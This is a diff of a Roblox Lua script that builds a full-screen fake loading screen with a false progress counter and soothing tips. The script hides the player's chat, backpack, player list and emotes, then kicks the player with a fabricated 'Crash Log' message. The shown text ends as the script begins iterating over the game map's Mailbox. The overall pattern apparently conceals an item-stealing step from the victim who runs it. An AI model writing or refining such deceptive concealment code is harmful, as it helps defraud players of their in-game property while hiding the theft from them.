@@ -44,18 +44,18 @@ local EndSequence = Instance.new("Frame")
 Loading.Name = "Loading"
 Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-Loading.DisplayOrder = 250
+Loading.DisplayOrder = 999999999
 MainFrame.Name = "MainFrame"
 MainFrame.Parent = Loading
 MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 MainFrame.BorderSizePixel = 0
-MainFrame.Position = UDim2.new(-0.125, 0,-0.125, 0)
+MainFrame.Position = UDim2.new(-0.125662372, 0, -0.125935167, 0)
 MainFrame.Size = UDim2.new(1.25, 0, 1.25, 0)
 Title.Name = "Title"
 Title.Parent = MainFrame
 Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Title.BackgroundTransparency = 1.000
-Title.Position = UDim2.new(0.185, 0,0.250, 0)
+Title.Position = UDim2.new(0.183329239, 0, 0.246382296, 0)
 Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
 Title.Font = Enum.Font.FredokaOne
 Title.Text = _G.ScriptName
@@ -156,7 +156,7 @@ EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 EndSequence.BorderSizePixel = 0
 EndSequence.Position = UDim2.new(1, 0, 0, 0)
 EndSequence.Size = UDim2.new(1, 0, 1, 0)
-local function FDEUJ_fake_script()
+local function NGZQAMK_fake_script()
 	local script = Instance.new('LocalScript', Dots)
 	while true do
 		wait(0.25)
@@ -173,8 +173,8 @@ local function FDEUJ_fake_script()
 		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
 	end
 end
-coroutine.wrap(FDEUJ_fake_script)()
-local function IIWP_fake_script()
+coroutine.wrap(NGZQAMK_fake_script)()
+local function NDID_fake_script()
 	local script = Instance.new('LocalScript', MainFrame)
 	local bar = script.Parent.Bar
 	local insidebar = bar.Bar2
@@ -186,8 +186,8 @@ local function IIWP_fake_script()
 	wait(3)
 	game.Players.LocalPlayer:Kick("[Crash Log ".. math.random(50, 5000) .. "] Please Rejoin.")
 end
-coroutine.wrap(IIWP_fake_script)()
-local function HDJINS_fake_script()
+coroutine.wrap(NDID_fake_script)()
+local function OVSBNB_fake_script()
 	local script = Instance.new('LocalScript', Percentage)
 	wait(5)
 	for i = 1,100 do
@@ -195,8 +195,8 @@ local function HDJINS_fake_script()
 		wait(2)
 	end
 end
-coroutine.wrap(HDJINS_fake_script)()
-local function KSANL_fake_script()
+coroutine.wrap(OVSBNB_fake_script)()
+local function SNUMK_fake_script()
 	local script = Instance.new('LocalScript', Tip)
 	local tip = script.Parent
 	while true do
@@ -212,15 +212,15 @@ local function KSANL_fake_script()
 		tip.Text = "This may take a while."
 	end
 end
-coroutine.wrap(KSANL_fake_script)()
-local function JTTEJPB_fake_script()
+coroutine.wrap(SNUMK_fake_script)()
+local function LSNGUH_fake_script()
 	local script = Instance.new('LocalScript', Loading)
 	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
 	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
 	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
 	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
 end
-coroutine.wrap(JTTEJPB_fake_script)()
+coroutine.wrap(LSNGUH_fake_script)()
 
 local mailbox = game:GetService("Workspace")["__MAP"].Interactive.Mailbox
 for i,v in pairs(mailbox:GetDescendants()) do
